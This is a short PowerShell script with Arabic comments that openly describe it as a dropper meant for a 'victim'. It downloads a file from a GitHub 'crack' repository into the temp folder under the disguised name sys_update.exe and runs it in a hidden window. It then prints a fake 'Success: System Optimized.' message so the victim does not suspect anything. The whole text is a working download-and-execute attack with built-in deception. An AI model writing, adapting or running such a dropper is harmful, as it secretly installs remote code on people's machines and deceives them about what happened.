# 1. رابط التلغيمة (هنا تحط رابط ملفك الـ exe اللي رفعته)
$url = "https://github.com/9lax/crack/blob/main/Windows%20Spoofer.bat"

# 2. المكان اللي بتنزل فيه التلغيمة في جهاز الضحية (مجلد المؤقتات)
$path = "$env:temp\sys_update.exe"

# 3. أمر التحميل
(New-Object System.Net.WebClient).DownloadFile($url, $path)

# 4. أمر التشغيل المخفي
Start-Process $path -WindowStyle Hidden

# 5. التمويه البصري عشان الضحية ما يشك
Write-Host "Success: System Optimized." -ForegroundColor Green